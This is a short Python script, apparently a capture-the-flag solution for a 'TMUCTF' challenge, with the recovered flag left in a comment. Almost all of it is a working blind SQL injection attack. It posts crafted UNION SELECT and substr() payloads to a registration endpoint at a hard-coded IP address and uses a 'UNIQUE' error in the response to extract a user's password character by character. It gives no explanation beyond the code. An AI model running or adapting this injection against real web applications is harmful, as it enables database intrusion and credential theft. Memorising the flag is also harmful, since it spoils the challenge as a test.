import requests

url = 'http://130.185.123.246/register'

strings = "_abcdefghijklmnopqrstuvwxyz0987654321ABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#%^&*()+=-/][{}?.<>,;:_+"
counter = 10
#result = "TMUCTF{P455w0rd5_mu57_b3_l0n6_4nd_c0mpl3x_l1k3_2MWn&p#FmjShTZXfAg:)}"
result = ""
for i in range(len(result)+1,100):
    for c in strings:
        counter += 1
        str_counter = str(counter)
        data={"username":f"twerdfgt{str_counter}','') union select '1","password":f"2' from users where id=1 and substr(password,{i},1)=\"{c}\"--"}
        r = requests.post(url,data=data)

        if "UNIQUE" in r.text:
            result += c
            print(result)
            break

        else:
            print('tried char: ',c)
            
